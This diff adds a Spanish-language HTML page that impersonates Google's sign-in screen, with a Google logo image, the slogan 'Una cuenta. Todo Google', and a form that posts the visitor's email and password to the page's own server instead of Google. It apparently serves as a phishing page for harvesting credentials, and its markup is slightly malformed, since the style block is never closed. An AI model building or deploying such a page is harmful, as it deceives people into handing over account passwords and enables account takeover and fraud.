@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        #login-box {
+            background-color: #eee;
+            border-radius: 10px;
+            text-align: center;
+            padding: 20px;
+            width: 300px;
+        }
+
+        #logo {
+            width: 100px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        h1 {
+            color: #555;
+            font-family: 'Gill Sans', sans-serif;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%; /* Ajustamos el ancho al 100% */
+            padding: 5px; /* Reducimos el relleno vertical */
+            margin: 5px 0; /* Reducimos el margen vertical */
+            border: none;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        input::placeholder {
+            color: #999;
+        }
+
+        button {
+            display: block;
+            width: 100%; /* Mismo ancho que los campos de entrada */
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            background-color: #1e90ff;
+            color: #fff;
+            font-family: 'Gill Sans', sans-serif;
+        }
+
+        #help {
+            color: #1e90ff;
+        }
+   </head>
+<body>
+    <div id="login-box">
+        <img id="logo" src="https://static.dezeen.com/uploads/2020/10/gmail-google-logo-rebrand-workspace-design_dezeen_2364_col_0.jpg" alt="Google logo">
+        <h1>Una cuenta. Todo Google</h1>
+        <form method="POST" action="/">
+            <input type="text" placeholder="Correo" name="correo">
+            <input type="password" placeholder="Contraseña" name="contrasena">
+            <button type="submit">Acceder</button>
+        </form>
+        <p id="help">¿Necesitas ayuda?</p>
+    </div>
+</body>
+          </html>
+      
